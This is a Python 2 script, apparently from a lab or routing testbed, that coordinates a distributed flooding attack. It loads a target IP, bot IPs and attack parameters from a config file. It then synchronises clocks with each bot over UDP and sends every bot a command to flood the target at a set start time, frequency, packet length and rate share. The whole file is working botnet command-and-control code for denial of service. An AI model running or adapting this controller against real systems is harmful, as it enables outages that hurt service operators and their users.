# -*- coding: utf-8 -*-
"""
Created on Fri Oct 27 20:21:48 2017

@author: zyl
"""
import socket
import time
import datetime
import ConfigParser  
import sys

conf = ConfigParser.ConfigParser()  
conf.read("/home/quagga/attack_info.cfg")  
attack_ip = conf.get("attack_ip", "attack_ip")
bot_ip_list = []
bot_l = conf.items("bot_ip")
for b in bot_l:
    bot_ip_list.append(b[1])
start_time = conf.get("start_time", "start_time")
wait = conf.get("wait", "wait")
attack_time = conf.get("attack_time", "attack_time")
per_attack_time = conf.get("per_attack_time", "per_attack_time")
attack_frequency = conf.get("attack_frequency", "attack_frequency")
length = conf.get("length", "length")
max = conf.get("max", "max")
if wait != 'None':
    wait_sec = int(wait)
    now_time = datetime.datetime.now()
    delta = datetime.timedelta(seconds=wait_sec)
    start_time_date = now_time + delta
    start_time = start_time_date.strftime('%Y-%m-%d-%H-%M-%S')

def get_time_diff(i,bot_ip):
    port = 17112
    host = bot_ip
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
#    print (host,port)
    data = 'time synchronization'
    s.sendto(data,(host,port))
    ts,addr=s.recvfrom(1024)
#    print ts
    s.close()
    tr = ("%.3f" % time.time())
#    print tr
    d = float(tr) - float(ts)
    return d
def attack(attack_ip,bot_ip,start_time_c,attack_time,attack_frequency,length,d,per_max,per_attack_time):
    bot_start_time = start_time_c - d
#    print bot_start_time
    port = 17111
    host = bot_ip
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    data = 'attack_ip:' + attack_ip + ' ' + 'bot_start_time:' + str(bot_start_time) + ' ' + 'attack_time:' + attack_time + ' ' + 'attack_frequency:' + attack_frequency + ' ' + 'length:' + length + ' ' + 'per_max:' + str(per_max) + ' ' + 'per_attack_time:' + str(per_attack_time)   
    s.sendto(data,(host,port))
    s.close()
def main():
    start_time_c = time.mktime(time.strptime(start_time, "%Y-%m-%d-%H-%M-%S"))
    per_max = float(max) / len(bot_ip_list)
    d_list = []
    for i in range(len(bot_ip_list)):
        d = get_time_diff(i,bot_ip_list[i])
        d_list.append(d)

    for i in range(len(bot_ip_list)):
        attack(attack_ip,bot_ip_list[i],start_time_c,attack_time,attack_frequency,length,d_list[i],per_max,per_attack_time)
main()
